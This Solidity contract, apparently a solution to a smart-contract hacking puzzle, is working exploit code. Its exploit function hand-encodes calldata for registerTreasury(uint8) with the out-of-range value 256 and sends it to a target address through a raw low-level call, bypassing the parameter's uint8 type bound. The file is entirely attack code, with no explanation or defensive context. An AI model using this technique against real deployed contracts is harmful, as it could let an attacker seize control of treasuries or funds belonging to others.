// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HigherOrderHelper {
    function getCalldata() external pure returns (bytes memory) {
        // Create calldata with:
        // - function selector for registerTreasury(uint8)
        // - a value > 255 at the correct position
        return abi.encodeWithSelector(
            bytes4(keccak256("registerTreasury(uint8)")),
            uint256(256)
        );
    }
    
    function exploit(address target) external {
        // Call registerTreasury with value > 255
        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("registerTreasury(uint8)")),
            uint256(256)
        );
        
        (bool success,) = target.call(data);
        require(success, "registerTreasury failed");
    }
}